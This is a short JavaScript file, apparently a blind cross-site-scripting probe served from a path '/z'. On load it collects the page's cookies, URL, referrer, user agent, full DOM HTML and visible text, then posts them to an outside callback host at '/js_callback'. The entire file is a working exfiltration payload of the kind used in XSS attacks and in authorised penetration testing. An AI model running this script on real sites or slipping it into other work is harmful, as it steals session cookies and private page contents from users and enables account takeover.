// probe_z.js - served at /z
// Immediately runs on import

// Helper: convert base64 to Blob (for optional screenshots)
function base64_to_blob(b64Data, contentType='application/octet-stream') {
    const byteCharacters = atob(b64Data);
    const byteArrays = [];
    const sliceSize = 1024;
    for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
        const slice = byteCharacters.slice(offset, offset + sliceSize);
        const byteNumbers = new Array(slice.length);
        for (let i = 0; i < slice.length; i++) {
            byteNumbers[i] = slice.charCodeAt(i);
        }
        byteArrays.push(new Uint8Array(byteNumbers));
    }
    return new Blob(byteArrays, {type: contentType});
}

// Prepare the data to send
const payloadData = {
    uri: location.href,
    cookies: document.cookie,
    referrer: document.referrer,
    "user-agent": navigator.userAgent,
    "browser-time": Date.now().toString(),
    title: document.title || "",
    dom: document.documentElement.outerHTML || "",
    text: document.body ? (document.body.innerText || document.body.textContent || "") : "",
    origin: location.origin,
    was_iframe: window.top !== window.self ? "true" : "false",
    injection_key: "" // option to add if available
};

// Send data to /js_callback as multipart/form-data
function sendCallback(data) {
    const formData = new FormData();
    Object.entries(data).forEach(([key, val]) => {
        if (key === 'screenshot' && val.startsWith('data:image/png;base64,')) {
            const base64Data = val.split(',')[1];
            formData.append('screenshot', base64_to_blob(base64Data, 'image/png'), 'screenshot.png');
        } else {
            formData.append(key, val);
        }
    });

    const xhr = new XMLHttpRequest();
    xhr.open('POST', '[HOST_URL]/js_callback', true);

    xhr.onload = function() {
        // Optional: handle success or failures here
        // console.log("XSS callback sent, status:", xhr.status);
    };
    xhr.onerror = function() {
        // console.error("XSS callback failed");
    };

    xhr.send(formData);
}

// Run immediately
sendCallback(payloadData);
